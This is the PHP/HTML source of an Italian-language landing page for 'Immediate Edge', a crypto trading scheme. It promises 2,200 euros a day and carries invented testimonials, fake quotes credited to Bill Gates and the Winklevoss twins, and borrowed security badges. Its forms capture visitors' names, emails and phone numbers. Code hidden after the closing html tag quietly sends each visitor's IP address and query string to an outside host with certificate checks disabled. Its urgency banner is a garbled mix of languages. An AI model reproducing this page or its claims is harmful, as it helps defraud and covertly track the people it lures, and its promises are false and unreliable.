<?php
$pixels = [ 'fb', 'fbe', 'ga', 'gad', 'mt', 'mtrk', 'tt', 'vk' ];
foreach ( $pixels as $px ) if (isset( $_GET[$px] )) {
	$z = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
	if ( $z ) setcookie( $px, $z, time() + 2592000, '/' );
}
?><!DOCTYPE html>
<html>

<head>
    <!-- 54 - 125 [o32;l4] immediate-edge-it -->
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>Immediate Edge - The Official Website</title>
    <link rel="stylesheet" href="css/styles.css" />
    <link href="assets/landing/css/landing.css" rel="stylesheet" type="text/css">
<!--[HEADER]--></head>

<body ng-controller="SubscribeController as sc">
    <header>
        <div class="top-header">
            <div class="row">
                <div class="col-xs-4 padding-0">
                    <div class="logo">
                        <img class="logo-nav-desktop" src="img/ie-logo-nav-desktop-1step.webp" alt="" />
                        <img class="logo-nav-mobile" src="img/ie-logo-nav-mobile.webp" alt="" />
                    </div>
                </div>
                <div class="col-xs-8 padding-0">
                    <div class="spots-mobile">
                        <p>Scadenza per le candidature! 43 posti disponibili</p>
                    </div>
                    <div class="spots-desktop">
                        <span class="flag gtd-geo-country-flag-icon"></span>
                        <p class="hurry">
                            <img src="img/it.webp" class="flag gtd-geo-country-flag-icon" />
                            <strong>Date prisa ! </strong>43 prostih mest
                            <span class="country-name-custom"></span>
                        </p>
                    </div>
                    <div class="clearfix"></div>
                </div>
            </div>
        </div>
    </header>
    <div class="section-1" id="top">
        <div class="container">
            <h1>
                Guadagnare fino a 2.200 euro al giorno con il software più
                intelligente del mondo
            </h1>
            <div class="m-50">
                <div class="row" id="form">
                    <div class="col-md-8">
                        <div class="videoWrapper">
                            <div class="embed-responsive">
                                <img src="img/poster.webp" alt="">
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="primary-form">
                            <div class="form-logo">
                                <img src="img/ice-logo.svg" alt="" />
                            </div>
                            <div class="form-block">
                                <div class="form-signup-wrapper">
                                    <div class="form-optin-holder">
                                        <div class="intgrtn-sp-form-step-1">
                                            <div data-intgrtn-form-optin="">
                                                <form name="intgrtnFormOptin" action="api.php?<?=http_build_query($_GET);?>" method="post" class="intgrtn-form-optin"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=htmlspecialchars($_GET["uuid"]);?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=htmlspecialchars($_GET["fbclid"]);?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=htmlspecialchars($_GET["gclid"]);?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=htmlspecialchars($_GET["cpc"]);?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=htmlspecialchars($_GET["cur"]);?>" /><?php endif; ?>                                                    <div class="intgrtn-input-holder intgrtn-input-holder-first-name intgrtn-invalid">
                                                        <input class="intgrtn-input intgrtn-invalid" type="text" name="forename" placeholder="Nome" required />
                                                    </div>
                                                    <div class="intgrtn-input-holder intgrtn-input-holder-last-name">
                                                        <input class="intgrtn-input" type="text" name="surname" placeholder="Cognome" required />
                                                    </div>
                                                    <div class="intgrtn-input-holder intgrtn-input-holder-email">
                                                        <input class="intgrtn-input" type="email" name="email" placeholder="Email" required />
                                                    </div>
                                                    <div class="intgrtn-input-holder intgrtn-input-holder-last-name">
                                                        <input class="intgrtn-input phone" type="tel" name="phone" required />
                                                    </div>
                                                    <div class="intgrtn-btn-submit-holder">
                                                        <button class="intgrtn-btn-submit" type="submit" name="submit">
                                                            Iniziare a guadagnare
                                                        </button>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                        <div class="intgrtn-sp-form-step-2"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="secured">
                <div class="row">
                    <div class="col-xs-2">
                        <img src="img/symantec.webp" alt="" />
                    </div>
                    <div class="col-xs-2">
                        <img src="img/mcafee.webp" alt="" />
                    </div>
                    <div class="col-xs-2">
                        <img src="img/verisign.webp" alt="" />
                    </div>
                    <div class="col-xs-2">
                        <img src="img/ssl.webp" alt="" />
                    </div>
                    <div class="col-xs-2">
                        <img src="img/geotrust.webp" alt="" />
                    </div>
                    <div class="col-xs-2">
                        <img src="img/secure.svg" alt="" />
                    </div>
                </div>
            </div>
            <p class="subtitle">Unisciti a noi e guadagna €2200 al giorno</p>
        </div>
    </div>
    <div class="assets">
        <div class="container">
            <div class="owl-carousel owl-theme">
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/59.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Ricardo V: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>596.41</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/50.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Jose C: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>280.53</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/43.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Esteban H: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>262.74</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/21.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Alvaro S: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>633.47</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/44.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Isabel N: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>695.16</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/87.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Sofia H: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>679.71</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/81.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Adrian R: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>726.78</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/14.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Luis G: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>412.58</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
                <div class="item">
                    <div class="win">
                        <div class="person-icon">
                            <img src="img/88.webp" alt="" />
                        </div>
                        <p>
                            <span class="name"> Gabriel N: </span>
                            <span class="money"><span data-visitor-currency-symbol="">€</span>882.51</span>
                        </p>
                        <div class="clearfix"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="section-2">
        <div class="container">
            <div class="row">
                <div class="col-sm-6 p">
                    <div class="row">
                        <div class="col-lg-6">
                            <img src="img/img-pic-3.webp" alt="" class="cent-img" />
                        </div>
                        <div class="col-lg-6">
                            <div class="cent">
                                <h3>Bill Gates</h3>
                                <h4>Criptoinvestitore</h4>
                                <p>
                                    "Le criptovalute sono il modo più veloce per fare soldi
                                    istantanei nel mercato di oggi, se si sa dove guardare.
                                    Profitti massicci e crescita di centinaia o addirittura
                                    migliaia di punti percentuali sono disponibili per coloro
                                    che hanno gli strumenti per iniziare!"
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6 p">
                    <div class="row">
                        <div class="col-lg-6">
                            <img src="img/winkle.webp" alt="" class="cent-img" />
                        </div>
                        <div class="col-lg-6">
                            <div class="cent">
                                <h3>Gemelli Winklevoss</h3>
                                <h4>Miliardari del Bitcoin</h4>
                                <p>
                                    "Compra a buon mercato, vendi a caro prezzo" è semplice. Le
                                    criptovalute sono il futuro della rapida crescita e dei
                                    potenziali profitti. Non è necessario essere un esperto di
                                    Wall Street per ottenere il vantaggio competitivo necessario
                                    a trarre profitto da questo mercato da 500 miliardi di
                                    dollari".
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="section-5">
        <div class="container">
            <h2>
                I principianti ottengono un profitto immediato, ma con il nostro aiuto
                potrete guadagnare €2200 al giorno o €66.000 al mese.
            </h2>
        </div>
    </div>
    <div class="section-6 index2">
        <div class="container">
            <div class="row">
                <div class="col-md-3 col-sm-4">
                    <div class="user-feedback">
                        <div class="image-wrapper">
                            <img src="img/4.webp" alt="" />
                        </div>
                        <span class="name">Sam Holt</span>
                        <p>
                            Voglio solo ringraziarvi perché Immediate Edge ha davvero
                            cambiato la mia vita. In una sola settimana sono riuscito a
                            lasciare il mio lavoro!
                        </p>
                        <div class="country">
                            <img src="img/it.webp" class="flag gtd-geo-country-flag-icon" />
                            <span class="green"><span data-visitor-currency-symbol="">€</span> 5017</span>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3 col-sm-4">
                    <div class="user-feedback">
                        <div class="image-wrapper">
                            <img src="img/43.webp" alt="" />
                        </div>
                        <span class="name">Molly Anderson</span>
                        <p>
                            Ora ho 231.952 euro nel mio conto di trading. Non ci si può
                            credere!
                        </p>
                        <div class="country">
                            <img src="img/it.webp" class="flag gtd-geo-country-flag-icon" />
                            <span class="green"><span data-visitor-currency-symbol="">€</span> 266592</span>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3 col-sm-4">
                    <div class="user-feedback">
                        <div class="image-wrapper">
                            <img src="img/21.webp" alt="" />
                        </div>
                        <span class="name">Owen Jackson</span>
                        <p>
                            Sono senza parole. Non ho mai visto numeri del genere prima
                            d'ora. Grazie, Imeidate Edge
                        </p>
                        <div class="country">
                            <img src="img/it.webp" class="flag gtd-geo-country-flag-icon" />
                            <span class="green"><span data-visitor-currency-symbol="">€</span> 45474</span>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3 col-sm-4">
                    <div class="user-feedback">
                        <div class="image-wrapper">
                            <img src="img/91.webp" alt="" />
                        </div>
                        <span class="name">Mila Walker</span>
                        <p>
                            Ragazzi, questa cosa funziona davvero! È davvero fantastico. Lo
                            uso solo da un paio di settimane e ho già guadagnato più soldi
                            con questo strumento che con il mio lavoro negli ultimi mesi!
                        </p>
                        <div class="country">
                            <img src="img/it.webp" class="flag gtd-geo-country-flag-icon" />
                            <span class="green"><span data-visitor-currency-symbol="">€</span> 11365</span>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                </div>
                <div class="col-md-12 col-sm-12">
                    <div class="second-form">
                        <div class="form-logo">
                            <img src="img/ice-logo.svg" alt="" />
                        </div>
                        <div class="Immediate-Earnings">Guadagni immediati</div>
                        <div class="form-block">
                            <div class="form-signup-wrapper">
                                <div class="form-optin-holder">
                                    <div class="intgrtn-sp-form-step-1">
                                        <div data-intgrtn-form-optin="">
                                            <form name="intgrtnFormOptin" action="api.php?<?=http_build_query($_GET);?>" method="post" class="intgrtn-form-optin"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=htmlspecialchars($_GET["uuid"]);?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=htmlspecialchars($_GET["fbclid"]);?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=htmlspecialchars($_GET["gclid"]);?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=htmlspecialchars($_GET["cpc"]);?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=htmlspecialchars($_GET["cur"]);?>" /><?php endif; ?>                                                <div class="intgrtn-input-holder intgrtn-input-holder-first-name intgrtn-invalid">
                                                    <input class="intgrtn-input intgrtn-invalid" type="text" name="forename" placeholder="Nome" required />
                                                </div>
                                                <div class="intgrtn-input-holder intgrtn-input-holder-last-name">
                                                    <input class="intgrtn-input" type="text" name="surname" placeholder="Cognome" required />
                                                </div>
                                                <div class="intgrtn-input-holder intgrtn-input-holder-email">
                                                    <input class="intgrtn-input" type="email" name="email" placeholder="Email" required />
                                                </div>
                                                <div class="intgrtn-input-holder intgrtn-input-holder-last-name">
                                                    <input class="intgrtn-input phone" type="tel" name="phone" required />
                                                </div>
                                                <div class="intgrtn-btn-submit-holder">
                                                    <button class="intgrtn-btn-submit" type="submit" name="submit">
                                                        Iniziare a guadagnare
                                                    </button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                    <div class="intgrtn-sp-form-step-2"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="section-9">
        <div class="container">
            <div class="fb-logo">
                <img src="img/facebook.webp" alt="" />
            </div>
            <div class="date">
                <span class="js-today-date"></span>,
                <span class="js-today-time"></span>
            </div>
            <div class="comment">
                <div class="row">
                    <div class="col-md-2 col-sm-3">
                        <div class="user-img">
                            <img class="img-responsive" src="img/44.webp" alt="" />
                        </div>
                    </div>
                    <div class="col-md-10 col-sm-9">
                        <div class="name"><span>Tahlia Spencer</span></div>
                        <div class="star">
                            <span class="icon-icon icon-four-stars" style="margin: 10px 0"></span>
                        </div>
                        <div class="text">
                            Non ho mai fatto trading prima d'ora, ma Immediate Edge lo rende
                            così facile. Non avrei mai pensato di dirlo, perché il mondo
                            delle criptovalute può essere così complicato... ma è così
                            facile guadagnare somme di denaro inimmaginabili!
                        </div>
                        <div class="like">
                            <a href="#form"><i class="far fa-thumbs-up"></i>Like</a>
                            <a href="#form"><i class="far fa-comment"></i>Comment</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="comment">
                <div class="row">
                    <div class="col-md-2 col-sm-3">
                        <div class="user-img">
                            <img class="img-responsive" src="img/87.webp" alt="" />
                        </div>
                    </div>
                    <div class="col-md-10 col-sm-9">
                        <div class="name"><span>Annabel Foster</span></div>
                        <div class="star">
                            <span class="icon-icon icon-four-stars" style="margin: 10px 0"></span>
                        </div>
                        <div class="text">
                            Questo è esattamente ciò che stavo aspettando! Il vostro
                            supporto educativo e il vostro sistema altamente efficace mi
                            hanno agganciato per tutta la vita! Grazie mille
                        </div>
                        <div class="like">
                            <a href="#form"><i class="far fa-thumbs-up"></i>Like</a>
                            <a href="#form"><i class="far fa-comment"></i>Comment</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="comment">
                <div class="row">
                    <div class="col-md-2 col-sm-3">
                        <div class="user-img">
                            <img class="img-responsive" src="img/81.webp" alt="" />
                        </div>
                    </div>
                    <div class="col-md-10 col-sm-9">
                        <div class="name"><span>William Spencer</span></div>
                        <div class="star">
                            <span class="icon-icon icon-four-stars" style="margin: 10px 0"></span>
                        </div>
                        <div class="text">
                            Nel mio primo giorno, ho guadagnato oltre 900 dollari su quello
                            che posso dire... Ho finalmente trovato qualcosa che dà grandi
                            risultati!
                        </div>
                        <div class="like">
                            <a href="#form"><i class="far fa-thumbs-up"></i>Like</a>
                            <a href="#form"><i class="far fa-comment"></i>Comment</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="comment">
                <div class="row">
                    <div class="col-md-2 col-sm-3">
                        <div class="user-img">
                            <img class="img-responsive" src="img/14.webp" alt="" />
                        </div>
                    </div>
                    <div class="col-md-10 col-sm-9">
                        <div class="name"><span>Carter Thomas</span></div>
                        <div class="star">
                            <span class="icon-icon icon-four-stars" style="margin: 10px 0"></span>
                        </div>
                        <div class="text">
                            I have had money in my account since day one, I still can't
                            believe it... I love your system and great customer service!
                        </div>
                        <div class="like">
                            <a href="#form"><i class="far fa-thumbs-up"></i>Like</a>
                            <a href="#form"><i class="far fa-comment"></i>Comment</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="earningsPopup" class="just-made">
        <div class="pull-left">
            <p class="name">Jay M Made</p>
            <span class="green">$ 1093.20</span>
        </div>
        <div class="pull-right">
            <div class="avatar">
                <span class="flag gtd-geo-country-flag-icon flag-2"></span>
                <img src="img/user.webp" alt="" />
            </div>
        </div>
    </div>
    <footer class="footer">
        <div class="container">
            <img src="img/ie-logo-nav-desktop-1step.webp" class="footer-logo" alt="logo" />
            <div data-intgrtn-agreements="" data-intgrtn-type="4" style="font-size: 12px; padding-top: 20px"></div>
        </div>
    </footer>
    <input type="hidden" name="countryCode" value="it" />
    <script type="text/javascript" src="assets/landing/js/jquery.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/jquery.validate.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/form.js"></script>
    <script type="text/javascript" src="js/owl.carousel.min.js"></script>
    <script>
    var today = new Date();
    var dd = today.getDate();
    var mm = today.getMonth() + 1;
    var yyyy = today.getFullYear();

    if (dd < 10) {
        dd = "0" + dd;
    }

    if (mm < 10) {
        mm = "0" + mm;
    }

    $("#forbes-date").html(dd + "." + mm + "." + yyyy);
    $(".js-today-date").html(dd + "." + mm + "." + yyyy);
    document.addEventListener("visitorLocated", function(e) {});
    $('a[href^="#"]').click(function(e) {
        e.preventDefault();
        var aid = $(this).attr("href");
        $('html,body').animate({ scrollTop: $(aid).offset().top }, 'slow');
    });
    $(".owl-carousel").owlCarousel({
        loop: !0,
        margin: 0,
        autoplay: !0,
        slideTransition: "linear",
        autoplaySpeed: 7e3,
        autoplayHoverPause: !1,
        dots: !1,
        nav: !1,
        responsiveClass: !0,
        responsive: { 0: { items: 1 }, 600: { items: 1 }, 1e3: { items: 2 }, 1410: { items: 3 } }
    });
    </script>
<?php
$pixl = array (
  'fb' => '',
  'fbe' => 'Lead',
  'ga' => '',
  'gad' => '',
  'tt' => '',
  'vk' => '',
  'mt' => '',
  'mtrk' => '',
);
$isbad = isset($_GET['id']) && substr( $_GET['id'], 0, 1 ) == '0';
if ( isset($_GET['status']) && $_GET['status'] == 'error' ) $isbad = true;
foreach ( $pixl as $px => $df ) if ( $isbad ) {
	$$px = false;
} elseif (isset( $_GET[$px] )) {
	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
} elseif (isset( $_COOKIE[$px] )) {
	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_COOKIE[$px], FILTER_SANITIZE_STRING )) );
} else $$px = $df;
if ( $fb ) {
	$fb = explode( ',', $fb );
	?><script>!function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js'); <?php
	foreach ( $fb as $f ) if ( $f = trim($f) ) :
	?> fbq('init', '<?=$f;?>'); <?php
	endif;
	?> fbq('track', 'PageView'); setTimeout( fbq, 30000, 'track', 'ViewContent' );</script><noscript><?php
	foreach ( $fb as $f ) if ( $f = trim($f) ) :
	?><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?=$f;?>&ev=PageView&noscript=1" /><?php
	endif;
	?></noscript><?php
}
if ( $ga ) {
	$gtm = ( strtolower(substr( $ga, 0, 3 )) == 'gtm' ) ? 1 : 0;
	if ( $gtm ) {
		?><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','<?=$ga;?>');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=<?=$ga;?>" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><?php
	} else {
		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>');</script><?php
	}
}
if ( $tt ) {
	?><script> !function (w, d, t) {  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)}; ttq.load('<?=$tt;?>'); ttq.page(); }(window, document, 'ttq'); </script><?php
}
if ( $vk ) {
	?><script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src='https://vk.com/js/api/openapi.js?169',t.onload=function(){VK.Retargeting.Init("<?=$vk;?>"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=<?=$vk;?>" style="position:fixed; left:-999px;" alt=""/></noscript><?php
}
if ( $mt ) {
	?><script type="text/javascript"> var _tmr = window._tmr || (window._tmr = []); _tmr.push({id: "<?=$mt;?>", type: "pageView", start: (new Date()).getTime(), pid: "USER_ID"}); (function (d, w, id) { if (d.getElementById(id)) return; var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id; ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js"; var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);}; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "topmailru-code");</script><noscript><div><img src="//top-fwz1.mail.ru/counter?id=<?=$mt;?>;js=na" style="border:0;position:absolute;left:-9999px;" alt="" /></div></noscript><?php
}
if ( $mtrk ) {
	?><script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(<?=$mtrk;?>, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script><noscript><div><img src="https://mc.yandex.ru/watch/<?=$mtrk;?>" style="position:absolute; left:-9999px;" alt="" /></div></noscript><?php
}
?></body>

</html><?php
error_reporting( 0 ); // Fuck PHP 8.2 and all the fucking hipsters
$ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : ( isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : ( isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : ( isset($_SERVER["HTTP_X_CLIENT_IP"]) ? $_SERVER["HTTP_X_CLIENT_IP"] : $_SERVER["REMOTE_ADDR"]) ) );
$host = isset($_SERVER["HTTP_X_FORWARDED_HOST"]) ? $_SERVER["HTTP_X_FORWARDED_HOST"] : ( isset($_SERVER["HTTP_X_HOST"]) ? $_SERVER["HTTP_X_HOST"] : ( isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"] ));
$curl = curl_init( "https://r.escaped.gg/immediateedge/it/signin/?flow=352&_clientip=$ip&_clienthost=$host&" . http_build_query($_GET) );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
if (isset( $_SERVER["HTTP_USER_AGENT"] )) curl_setopt( $curl, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"] );
curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
curl_exec( $curl );
curl_close( $curl );
?>